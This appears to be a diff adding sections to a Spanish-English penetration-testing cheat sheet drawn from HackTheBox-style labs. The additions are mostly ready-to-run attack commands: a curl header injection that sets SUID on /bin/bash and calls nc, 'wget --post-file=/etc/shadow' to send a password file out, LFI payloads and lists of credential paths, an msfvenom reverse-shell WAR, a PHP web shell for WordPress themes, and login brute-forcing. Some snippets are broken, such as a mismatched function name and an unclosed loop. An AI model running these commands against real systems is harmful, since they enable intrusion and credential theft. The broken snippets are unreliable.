@@ -35,6 +35,7 @@
 		- [RDP](#rdp)
 		- [showmount](#showmount)
   		- [SMB](#smb)
+        - [DNS](#dns)
 		- [smbclient](#smbclient)
 		- [SSH](#ssh)
 		- [Time and Date](#time-and-date)
@@ -65,6 +66,7 @@
 		- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
 		- [Upload Vulnerabilities](#upload-vulnerabilities)
 		- [wfuzz](#wfuzz)
+        - [Ferobuster](#ferobuster)
 		- [WPScan](#wpscan)
 		- [XML External Entity (XXE)](#xml-external-entity-xxe)
 	- [Database Analysis](#database-analysis)
@@ -189,6 +191,7 @@
 | --- | --- |
 | nikto | https://github.com/sullo/nikto |
 | Sparta | https://github.com/SECFORCE/sparta |
+| fierce | https://github.com/mschwager/fierce |
 
 ### Web Application Analysis
 
@@ -205,6 +208,7 @@
 | PHPGGC | https://github.com/ambionics/phpggc |
 | Spose | https://github.com/aancw/spose |
 | Wfuzz | https://github.com/xmendez/wfuzz |
+| Ferobuster | https://github.com/epi052/feroxbuster |
 | WhatWeb | https://github.com/urbanadventurer/WhatWeb |
 | WPScan | https://github.com/wpscanteam/wpscan |
 | Davtest | https://github.com/cldrn/davtest |
@@ -505,6 +509,70 @@ curl -F myFile=@<FILE> http://<RHOST>                                          /
 curl${IFS}<LHOST>/<FILE>                                                       // Internal Field Separator (IFS) example
 curl -I -X OPTIONS http://IP/Pagina/                                           // Check accepted methods
 ```
+```c
+ curl -s http://docker.hackthebox.eu:<puerto>/ -X POST -d hash=$(curl -s http://docker.hackthebox.eu:<puerto>/ -c cookie.txt | grep -oP "(?<=h3 align='center'>).*(?=</)" | tr -d "\n" | md5sum | tr -d -) -b cookie
+```
+
+Wget admits 255 character
+Create 255 character files
+
+
+```c
+curl -s -X GET http://localhost/firewall.php -H "X-FOWARDED-FOR: 1.1.1.1 ; sudo chmod u+s /bin/bash | nc IP PORT;" -H "Cookie: PHPSESSID=5fufq0mqfu8f3oql8cijidhfhj"
+```
+
+```c
+curl IP/$(whoami)
+curl IP/`whoami`
+```
+
+Con curl probar extensiones diferentes
+
+```c
+ftp://
+fi\le:///root/
+```
+
+$IFS es espacio
+
+```c
+fi\le:///root/root.txt$IFP-o$IFS/tmp/
+```
+
+Between keys it creates spaces on the comas
+
+```c
+{fi\le:///root/root.txt,-o,/tmp/}
+```
+
+```c
+curl --config /file
+```
+
+IPv6
+
+```c
+curl -g -6 "http://[dead:beef:2:1006]":PORT/FILE
+```
+
+For JWT the header is "Authorization: bearer TOKEN" 
+
+ With a token 
+```c
+curl -H "Authorization: bearer TOKEN" -i   http://IP:PORT/
+```
+
+###### Wget
+
+If wget used copy  /etc/shadow or  id_rsa
+
+```c
+wget --post-file=/etc/shadow IP/fileshadow
+```
+
+```c
+wget -O  - http://IP > /dev/null
+```
 
 #### File Transfer
 
@@ -789,6 +857,37 @@ __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ftp <RHOST>
 ftp -A <RHOST>
 wget -r ftp://anonymous:anonymous@<RHOST>
+```
+
+connect 
+```c
+ftp IP
+ftp user@ftpdomain.com
+```
+```c
+list content dir
+```
+
+Try upload a  file 
+
+```c
+put file.txt
+```
+User:  anonymous
+Password:  anonymous@domain.com
+
+
+```c
+wget -m --no-passive ftp://USER:PASSWORD@IP
+wget -m --no-passive ftp://anonymous:anonymous@IP
+```
+
+Mount ftp
+
+```c
+curlftpfs USER:PASS@IP LOCATE_MOUNT
+showmount -e IP
+mount -t nfs IP:/NFS_DIR  /mnt/NUESTRO_DIR
 ```
 
 #### Kerberos
@@ -1386,6 +1485,74 @@ chown root:root sid-shell; chmod +s sid-shell
 mount.cifs //<RHOST>/<SHARE> /mnt/remote
 guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
 ```
+#### DNS
+
+##### dig 
+
+Name server
+
+```c
+dig ns DOMINIO @IP
+```
+
+Mail server
+
+```c
+dig ms DOMINIO @IP
+```
+
+Pointers
+
+```c
+dig ptr DOMINIO @IP
+```
+
+DNS Info
+
+```c
+dig axfr @IP
+dnsenum DOMAIN
+```
+
+Domain zone transfer
+
+```c
+dig axfr DOMINIO @IP
+dnsrecon -d dominio -t AXFR 
+dnsrecon -d dominio -a
+```
+
+All subdomains
+
+```c
+dig @IP DOMAIN 't AXFR +nocookie
+```
+
+If server is blind 
+
+```c
+dig version.bind CHAOS TXT @IP
+```
+nslookup 
+
+```c
+server IP
+IP
+   ⇒ set q=NS  name server  MX mail server
+   ⇒ doman.com
+   ⇒ exit
+```
+Brute force
+
+```c
+dnsenum DOMAIN -f /path_to_dns_dic
+dnsmap DOMAIN  thats its own bruteforce
+```
+
+```c
+fierce -dns DOMAIN
+fierce -dns else.domain -dnsserver DOMAIN
+```
 
 #### smbclient
 
@@ -1401,6 +1568,12 @@ smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
 smbclient "\\\\<RHOST>\<SHARE>"
 smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
 smbclient --no-pass //<RHOST>/<SHARE>
+```
+
+```c
+smbclient -L IP -N 2>/dev/null | grep “CARPETA” | awk '{print $1}' | while read sharedFolder; do echo “===”$(sharedFolder)"=="; smbclient //IP/${sharedFolder} -c “dir”; echo; done 
+
+smbclient -L 10.10.11.152 -N | grep -i "disk" | sed 's/\s*\(.*\)\s*Disk.*/\1/'| while read sharedfolder; do echo "======{$sharedfolder}=====";smbclient -N "/IP/${sharedfolder}" -c dir; echo; done
 ```
 
 ##### Download multiple files at once
@@ -1746,8 +1919,7 @@ nmap -Pn -n --script vuln IP
 
 ```c
 nmap -sV --script http-enum -p80 IP -oN webscan
-```c
-
+```
 
 OUTPUT FORMAT 
 -oX xml format
@@ -1784,7 +1956,6 @@ All ports Scan
 
 ```c
   Nmap HTB ports=$(nmap -p- --min-rate=1000  -T4 IP PORT | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)nmap 
-
 ```
 
 #### Port Scanning
@@ -2112,6 +2283,62 @@ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 ..././
 ...\.\
 ```
+
+Interesting routes:
+
+```c
+/home/USER/.ssh/.id_rsa
+/etc/passwd
+/etc/shadow
+/etc/login.def
+/proc/net/tcp 
+/proc/sched_debug
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/cwd
+```
+
+```c
+cat tcp.txt| awk '{print $2}' | grep -v "address" | awk '{print $2}' FS=: | sort -u
+```
+
+List of paths https://github.com/carlospolop/Auto_Wordlists
+
+###### PHP
+
+```c
+/index.php?file=php://filter/convert.base64-encode/resource=FILE.php
+```
+
+```c
+curl -s "http://=/proc/net/fib_trie" |grep -i "host local" -B 1 | grep -oP '\d{1,3}\d{1,3}\d{1,3}\d{1,3}' | sort -u
+```
+
+Open internal ports
+
+```c
+curl -s "http://=/proc/net/tcp" | awk '{print $2}' | grep -v "local_address" | awk '{print $2}'  FS=":" | sort -u
+```
+
+```c
+for port in $(curl); do echo "[port] -> Puerto $(echo "ibase=16; $port" | bc)"; done
+```
+
+Try
+
+```c
+....//....//....//
+```
+
+Unicode https://jlajara.gitlab.io/Bypass_WAF_Unicode  https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability
+
+###### nginx paths
+/etc/nginx
+/etc/nginx/nginx.conf/etc/nginx/nginx.conf
+/etc/nginx/sites-available/
+/etc/nginx/sites-enabled/
+/var/log/nginx/access.log
+/var/log/nginx/error.log
 
 ##### php://filter Wrapper
 
@@ -2684,6 +2911,18 @@ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-1
 wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
 ```
 
+##### User Enumeration
+
+```c
+wfuzz -c -t 400 -L  --hc=404 -w /usr/share/secList/Username/Name/names -d "username=FUZZ&password=password" --hs "ERROR MESAGE" http://IP/login.php/
+wfuzz -c -z file,/opt/SecLists/Usernames/Names/names.txt --sc 200 -d "username=FUZZ&passwd=Q3VybGluZzIwMTgh&option=com_login&task=login&return=aW5kZXgucGhw&b7c415b2f0a3452207ba6531f8cfdb09=1"  http://IP/administrator/index.php
+```
+##### Port discovery
+
+```c
+wfuzz -c -t 400 -L  --hw=0 --hc=404 -w ports.txt 'http://IP:PORT/url.php?path=http://localhost:FUZZ'
+```
+
 ##### Enumerating PIDs
 
 ```c
@@ -2695,6 +2934,18 @@ wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php
 ```c
 wfuzz -H 'Cookie: COKIE'
 ```
+#### Ferobuster
+
+```c
+ ferobuster -u http://IP:PORT -o OutputFile -x php
+```
+
+Extract links 
+
+```c
+feroxbuster -u http://127.1 --extract-links
+```
+
 
 #### WPScan
 
@@ -2704,6 +2955,7 @@ wpscan --url https://<RHOST> --plugins-detection aggressive
 wpscan --url https://<RHOST> --disable-tls-checks
 wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
 wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
+wpscan --url 'IP' --enumerate vp, u
 ```
 Certificate information
 
@@ -2947,6 +3199,88 @@ In Burp
 ```c
 Content-Disposition: form-data; name="image"; filename="phprev.jpeg"
 Content-Type: application/x-php
+```
+#### Technologies
+
+##### Tomcat
+
+Path /manager/html
+Try to brute force
+Upload a ,war file
+
+```c
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o revshell.war
+```
+##### Joomla
+
+https://hackertarget.com/attacking-enumerating-joomla/
+go tu rute 
+
+```c
+http://IP/administrator/manifests/files/joomla.xm
+```
+Go to template and change index.php for a revershell
+
+https://www.hackingarticles.in/joomla-reverse-shell/
+
+
+##### WORDPRESS
+login en 
+```c
+wp-admin
+```
+
+Enumerate plugins 
+
+http://IP/wp-content/ or http://IP/wp-content/plugins
+
+```c
+wpscan --url http://172.31.1.14 -e ap --plugins-detection aggressive
+```
+
+Users  
+```c
+wp-json/wp/v2/users/
+```
+
+Fuzz plugins
+```c
+wfuzz -c --hc=404 -t 200 -w wp-plugins.fuzz.txt http://IP/FUZZ
+```
+
+Edit in Apperance the theme 404 with php revershell of pentestmonkey
+
+```c
+function webshell(){
+	echo shell_exec($_GET['cmd']);
+}
+add_action('wp_head', 'web_shell');
+```
+
+Check if xml-rpc
+
+```c
+curl -s -X POST http://IP/xmlrpc.php -d '<?xml version="1.0" encoding="utf-8"?><methodCall>  
+<methodName>system.listMethods</methodName>  
+<params></params>  
+</methodCall>'
+```
+
+Ping back
+
+```c
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param>
+<value><string>https://postb.in/1562017983221-4377199190203</string></value>
+</param>
+<param>
+<value><string>https://example.com/</string></value>
+</param>
+</params>
+</methodCall>
 ```
 
 ### Database Analysis
@@ -6044,14 +6378,45 @@ List groups
 
 ```c
 for group in $(groups); do echo "$group"; done
-```c
+```
  
 ```c
 sudo -u#-1 /bin/bash
 ```
+List folders recursively
+
+```c
+find . -type d | while read directory; do
+touch ${directory}/henric 2>/dev/null && echo "${direcory} - File created" && rm ${directory}/henric
+mkdir ${directory}/henric 2>/dev/null && echo "${direcory} - directory created" && rmdir ${directory}/henric
+```
+
+```c
+tree | grep -i "iis"
+```
+
+```c
+find \-name IIS.fuzz.txt
+```
+
+```c
+find DIRECTORY -type f | xargs file | grep -v “ALGO_FILTRAR” | xargs cat 2>/dev/null
+```
+
+Find folders by words 
+
+```c
+grep -Ril “TEXT” .
+```
+
+Find folder that contains pattern
+
+```c
+grep -rnw '/path/to/somewhere/' -e 'pattern
+```
+
 ###### SUID Files
 
-Si un script se ejecuta periodicamente con privilegios suid
 If an script gets execute preiodicatly with suid privileges
 
 ```c
@@ -6088,6 +6453,7 @@ Check if the prvilege is changed
 ```c
 watch -n 1 ls -l /bin/bash
 ```
+
 Exploit
 
 ```c
@@ -7783,6 +8149,10 @@ pwncat-cs -lp <LPORT>
 
 ```c
 rpcclient -U "" <RHOST>
+```
+
+```c
+rpcclient -U '' -N  IP -c "enumdomusers" | awk '{print $1}' | cut -d ":" -f2 | tr -d "[]"
 ```
 
 ```c
